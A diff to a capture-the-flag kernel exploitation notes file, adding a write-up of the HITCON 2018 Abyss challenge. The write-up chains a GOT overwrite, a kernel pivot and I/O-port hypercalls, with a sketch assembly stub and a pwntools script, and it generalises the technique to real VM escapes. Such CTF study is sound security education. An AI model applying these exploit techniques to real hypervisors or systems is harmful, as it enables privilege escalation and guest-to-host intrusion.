@@ -26,6 +26,7 @@
 - [core_pattern Overwrite](#core_pattern-overwrite)
 - [Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
 - [eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)](#ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022)
+- [User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)](#user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018)
 For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
 
 For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).
@@ -553,3 +554,40 @@ BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
 **Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches -- each patch implies a prior exploitable bug.
 
 See also: [kernel-techniques.md](kernel-techniques.md) for additional kernel exploitation techniques.
+
+---
+
+## User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)
+
+**Pattern:** A three-layer challenge (user.elf → kernel.bin → hypervisor) restricts direct hypercalls from userspace via a whitelist enforced in kernel.bin. The attacker (1) corrupts a RPN-calculator user-mode program to write arbitrary bytes into its GOT, (2) uses that write to break out to kernel mode, and (3) from kernel mode issues a hypercall directly by executing `out dx, eax` on I/O ports `0x8000..0x80FF`, which the hypervisor handles as a syscall dispatch. The final twist: the hypervisor only accepts strings that already live in kernel memory, so a deliberately failing `open()` syscall is used to seed a kernel buffer with the target path before re-invoking the hypercall with that buffer address.
+
+```asm
+; Kernel-mode stub running inside kernel.bin after the pivot
+mov dx, 0x8000 + 5          ; I/O port = base + syscall_number (here: open)
+mov eax, <kernel_buffer>    ; pointer that lives in kernel memory
+out dx, eax                 ; hypervisor reads from the port as an arg
+
+mov dx, 0x8000 + 0          ; syscall 0 = read
+mov eax, flag_buffer
+out dx, eax
+```
+
+```python
+# User-mode payload that pivots into kernel.bin via GOT overwrite
+from pwn import *
+io = remote("challenge.hitcon", 1337)
+
+# 1. RPN-calc overwrites got['strtol'] with a kernel gadget that calls the
+#    privileged hypercall stub.
+payload = rpn_overwrite(target="strtol",
+                        value=kernel_gadget_address)
+io.sendline(payload)
+
+# 2. Kernel stub runs the I/O-port sequence above and writes the flag back.
+io.recvuntil(b"flag{")
+log.success(b"flag{" + io.recvuntil(b"}"))
+```
+
+**Key insight:** The more privilege rings a challenge stacks, the more important it is to map *where data must live* versus *where code must run*. HITCON Abyss enforced a kernel whitelist on userspace hypercalls, but kernel code itself could still poke the hypervisor ports directly. The same pattern recurs in real VM escapes: a guest kernel primitive plus an I/O-port write reaches the VMM without going through the guest's own syscall table. When attacking `kvm_guest_enter` style hypervisors, look for memory-mapped I/O regions or port ranges that the VMM traps — they are hypercalls in disguise and often lack the argument sanitisation that formal hypercall interfaces require.
+
+**References:** HITCON CTF 2018 — Abyss I & II, writeups 11918, 11919, 11933, 11934, 11937, 11938
